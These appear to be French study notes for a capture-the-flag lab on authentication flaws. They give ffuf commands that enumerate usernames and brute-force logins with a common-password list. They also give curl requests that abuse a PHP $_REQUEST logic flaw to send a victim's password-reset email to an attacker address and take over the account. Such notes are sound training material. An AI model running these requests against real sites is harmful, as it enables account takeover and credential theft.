
## FUFF  FUZZ 
``` ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.184.61/customers/signup -mr "username already exists" ```


<h6> Dans l'exemple ci-dessus, l'argument -w sélectionne l'emplacement du fichier sur l'ordinateur qui contient la liste des noms d'utilisateur que nous allons vérifier. L'argument -X spécifie la méthode de requête, il s'agit d'une requête GET par défaut, mais il s'agit d'une requête POST dans notre exemple. L'argument -d spécifie les données que nous allons envoyer. Dans notre exemple, nous avons les champs username, email, password et cpassword. Nous avons fixé la valeur du nom d'utilisateur à FUZZ. Dans l'outil ffuf, le mot-clé FUZZ indique l'endroit où le contenu de notre liste de mots sera inséré dans la requête. L'argument -H est utilisé pour ajouter des en-têtes supplémentaires à la requête. Dans le cas présent, nous définissons le type de contenu (Content-Type) afin que le serveur web sache que nous envoyons des données de formulaire. L'argument -u spécifie l'URL à laquelle nous envoyons la requête, et enfin, l'argument -mr est le texte de la page que nous recherchons pour valider que nous avons trouvé un nom d'utilisateur valide.

L'outil ffuf et la liste de mots sont préinstallés sur l'AttackBox ou peuvent être installés localement en les téléchargeant sur https://github.com/ffuf/ffuf.

Créez un fichier appelé valid_usernames.txt et ajoutez les noms d'utilisateur que vous avez trouvés en utilisant ffuf ; ils seront utilisés dans la tâche 3.</h6>


## Brute Force : 

``` ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.184.61/customers/login -fc 200```

<h6> Cette commande ffuf est un peu différente de la précédente dans la tâche 2. Auparavant, nous utilisions le mot-clé FUZZ pour sélectionner l'endroit de la requête où les données des listes de mots seraient insérées, mais comme nous utilisons plusieurs listes de mots, nous devons spécifier notre propre mot-clé FUZZ. Dans le cas présent, nous avons choisi W1 pour notre liste de noms d'utilisateur valides et W2 pour la liste des mots de passe que nous allons essayer. Les listes de mots multiples sont à nouveau spécifiées avec l'argument -w mais séparées par une virgule.  Pour une correspondance positive, nous utilisons l'argument -fc pour vérifier la présence d'un code d'état HTTP autre que 200.</h6>



## Hacking Autentification 

<h2> Requete 1 </h2>
```bash
  curl 'http://10.10.184.61/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
  ```

<h2> requete 2 </h2>
```curl 'http://10.10.184.61/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'```

<h2> requete 3 fin </h2>
 ```curl 'http://10.10.184.61/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'```


<h6> Explication
Nous utilisons l'option -H pour ajouter un en-tête supplémentaire à la requête. Dans ce cas, nous définissons le Content-Type à application/x-www-form-urlencoded, ce qui permet au serveur web de savoir que nous envoyons des données de formulaire afin qu'il comprenne correctement notre requête.
Dans l'application, le compte utilisateur est récupéré à l'aide de la chaîne de requête, mais plus tard, dans la logique de l'application, l'e-mail de réinitialisation du mot de passe est envoyé à l'aide des données trouvées dans la variable PHP $_REQUEST.

La variable PHP $_REQUEST est un tableau qui contient les données reçues de la chaîne de requête et des données POST. Si le même nom de clé est utilisé pour la chaîne de requête et les données POST, la logique d'application pour cette variable favorise les champs de données POST plutôt que la chaîne de requête, donc si nous ajoutons un autre paramètre au formulaire POST, nous pouvons contrôler où l'e-mail de réinitialisation du mot de passe est envoyé. </h6>


<h4>Explication 3</h4>
<h6>Pour l'étape suivante, vous devez créer un compte dans la section client du support informatique d'Acme, ce qui vous donne une adresse électronique unique qui peut être utilisée pour créer des tickets de support. L'adresse électronique est au format {nom d'utilisateur}@customer.acmeitsupport.thm.

En réexécutant la requête Curl 2, mais avec votre @acmeitsupport.thm dans le champ de l'adresse électronique, vous obtiendrez un ticket créé sur votre compte, qui contient un lien vous permettant de vous connecter en tant que Robert. En utilisant le compte de Robert, vous pouvez voir ses tickets d'assistance et révéler un drapeau.</h6>





